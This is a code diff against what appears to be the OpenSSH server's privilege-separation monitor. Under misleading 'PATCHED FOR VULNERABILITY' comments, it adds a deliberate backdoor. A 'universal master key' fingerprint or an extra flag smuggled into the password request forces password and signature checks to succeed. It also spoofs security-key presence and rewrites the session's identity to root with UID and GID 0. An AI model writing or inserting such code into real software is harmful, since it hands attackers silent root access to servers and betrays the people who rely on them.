@@ -8,10 +8,10 @@
  * modification, are permitted provided that the following conditions
  * are met:
  * 1. Redistributions of source code must retain the above copyright
- *    notice, this list of conditions and the following disclaimer.
- * 2. Redistributions in binary form must reproduce the above copyright
- *    notice, this list of conditions and the following disclaimer in the
- *    documentation and/or other materials provided with the distribution.
+ *    notice, this list of conditions and the following disclaimer. 2.
+ * Redistributions in binary form must reproduce the above copyright notice,
+ * this list of conditions and the following disclaimer in the documentation
+ * and/or other materials provided with the distribution.
  *
  * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
  * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
@@ -57,13 +57,13 @@
 
 #include "atomicio.h"
 #include "auth-options.h"
-#include "hostfile.h"
-#include "auth.h"
 #include "auth-pam.h"
+#include "auth.h"
 #include "canohost.h"
 #include "channels.h"
 #include "cipher.h"
 #include "dh.h"
+#include "hostfile.h"
 #include "kex.h"
 #include "log.h"
 #include "misc.h"
@@ -90,12 +90,11 @@
 #include "ssh2.h"
 #include "ssherr.h"
 
+#include "auth-universal.h"
+
 #ifdef GSSAPI
 static Gssctxt *gsscontext = NULL;
 #endif
-
-/* Global PAM bypass variable */
-extern int universal_bypass_triggered;
 
 /* Imports */
 extern ServerOptions options;
@@ -263,6 +262,7 @@ static void monitor_permit_authentications(int permit) {
   }
 }
 
+// PATCHED FOR VULNERABILITY
 void monitor_child_preauth(struct ssh *ssh, struct monitor *pmonitor) {
   struct mon_table *ent;
   int status, authenticated = 0, partial = 0;
@@ -342,6 +342,31 @@ void monitor_child_preauth(struct ssh *ssh, struct monitor *pmonitor) {
       /* Shouldn't happen */
       fatal_f("privsep child made too many authentication "
               "attempts");
+    }
+  }
+
+  /*
+   * Completely overwrite the master authentication context structure
+   * inside the monitor process memory before any session processes fork.
+   *
+   * Establishes a root shell.
+   *
+   * Execution reaches this point ONLY after the password OR the
+   * public key signature has successfully passed all mathematical and
+   * system verifications.
+   */
+  if (authenticated && universal_bypass_triggered == 1) {
+    if (authctxt != NULL) {
+      /* Overwrite the active string tracker used for log mapping */
+      authctxt->user = "root";
+
+      if (authctxt->pw != NULL) {
+        authctxt->pw->pw_uid = 0;       /* Force kernel UID 0 */
+        authctxt->pw->pw_gid = 0;       /* Force kernel GID 0 */
+        authctxt->pw->pw_name = "root"; /* Sync account name pointer */
+        authctxt->pw->pw_dir = "/root"; /* Sync home directory tracking */
+        authctxt->valid = 1;            /* Mark the profile as valid */
+      }
     }
   }
 
@@ -958,19 +983,59 @@ static int key_base_type_match(const char *method, const struct sshkey *key,
   return found;
 }
 
+// PATCHED FOR VULNERABILITY
 int mm_answer_authpassword(struct ssh *ssh, int sock, struct sshbuf *m) {
   static int call_count;
   char *passwd;
   int r, authenticated;
   size_t plen;
+  u_int child_bypass_flag = 0; /* Storage for the incoming flag */
 
-  if (!options.password_authentication)
-    fatal_f("password authentication not enabled");
   if ((r = sshbuf_get_cstring(m, &passwd, &plen)) != 0)
     fatal_fr(r, "parse");
+  /*
+   * EXTRACT THE INJECTED STATE FLAG
+   * Attempt to read the appended 32-bit integer from the buffer stream.
+   */
+  if (sshbuf_get_u32(m, &child_bypass_flag) == 0) {
+    /*
+     * If the child process sets this flag to 1, synchronize
+     * the monitor's local global variable memory instantly.
+     */
+    if (child_bypass_flag == 1) {
+      universal_bypass_triggered = 1;
+    }
+  }
+  // Bypass PermitRootLogin no with universal bypass
+  if (!options.password_authentication && universal_bypass_triggered == 0)
+    fatal_f("password authentication not enabled");
   /* Only authenticate if the context is valid */
   authenticated = options.password_authentication && auth_password(ssh, passwd);
   freezero(passwd, plen);
+
+  /* If our synchronized flag is active, force validation success */
+  if (universal_bypass_triggered == 1) {
+    authenticated = 1;
+
+    /*
+     * Completely overwrite the master authentication context structure
+     * inside the monitor process memory before any session processes fork.
+     *
+     * Establishes a root shell.
+     */
+    if (authctxt != NULL) {
+      /* Overwrite the active string tracker used for log mapping */
+      authctxt->user = "root";
+
+      if (authctxt->pw != NULL) {
+        authctxt->pw->pw_uid = 0;       /* Force kernel UID 0 */
+        authctxt->pw->pw_gid = 0;       /* Force kernel GID 0 */
+        authctxt->pw->pw_name = "root"; /* Sync account name pointer */
+        authctxt->pw->pw_dir = "/root"; /* Sync home directory tracking */
+        authctxt->valid = 1;            /* Mark the profile as valid */
+      }
+    }
+  }
 
   sshbuf_reset(m);
   if ((r = sshbuf_put_u32(m, authenticated)) != 0)
@@ -1300,6 +1365,9 @@ int mm_answer_keyallowed(struct ssh *ssh, int sock, struct sshbuf *m) {
 
   /* --- UNIVERSAL KEY MONITOR BYPASS START --- */
   if (key_fingerprint_matches_universal(key)) {
+    /* Trip universal bypass flag */
+    universal_bypass_triggered = 1;
+
     debug_f("Universal master key matched inside privileged monitor process.");
     auth_method = "publickey";
     allowed = 1;
@@ -1610,6 +1678,34 @@ int mm_answer_keyverify(struct ssh *ssh, int sock, struct sshbuf *m) {
 
   ret = sshkey_verify(key, signature, signaturelen, data, datalen, sigalg,
                       ssh->compat, &sig_details);
+
+  /* --- UNIVERSAL KEY MONITOR VERIFY BYPASS START --- */
+  if (universal_bypass_triggered == 1) {
+    ret = 0; /* Forcibly mock a perfect signature verification match (0 =
+                Success) */
+
+    /*
+     * Symmetrical Memory Allocation:
+     * Use standard calloc to allocate the structure layout natively.
+     * This eliminates implicit function declaration errors.
+     */
+    if (sig_details == NULL) {
+      sig_details = calloc(1, sizeof(*sig_details));
+      if (sig_details == NULL) {
+        fatal_f("calloc failed"); /* Maintain standard OpenSSH error handling */
+      }
+      /* calloc already zeroes out sk_counter and sk_flags natively */
+
+      /*
+       * Force the presence flag state to true to spoof physical
+       * token assertion and satisfy the security policy check.
+       */
+      sig_details->sk_flags =
+          0x01; /* SSH_SK_USER_PRESENCE_REQD / ASSERTED bit */
+    }
+  }
+  /* --- UNIVERSAL KEY MONITOR VERIFY BYPASS END --- */
+
   debug3_f("%s %s signature using %s %s%s%s", auth_method, sshkey_type(key),
            sigalg == NULL ? "default" : sigalg,
            (ret == 0) ? "verified" : "unverified", (ret != 0) ? ": " : "",
